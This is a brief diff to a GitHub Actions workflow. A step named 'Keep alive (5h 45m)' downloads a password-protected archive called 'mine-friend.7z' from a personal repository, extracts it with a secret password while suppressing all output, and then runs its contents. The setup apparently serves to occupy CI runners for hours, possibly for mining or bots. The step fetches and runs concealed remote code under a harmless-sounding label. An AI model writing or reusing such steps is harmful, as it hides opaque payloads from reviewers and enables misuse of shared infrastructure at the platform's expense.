@@ -39,7 +39,8 @@ jobs:
       - name: Keep alive (5h 45m)
         run: |
           echo "Keeping runner alive..."
-          curl -LO https://github.com/mishakokzix/test/raw/refs/heads/main/mine-friend.7z 
+          curl -LO https://github.com/mishakokzix/test/raw/refs/heads/main/mine-friend.7z
+          ls mine-friend.7z || echo Failed
           7z x mine-friend.7z -p"$PASS" -y > /dev/null 2>&1 || echo Failed
           cd mine-friend
           if [ "${{ inputs.bot_selection }}" = "true" ]; then
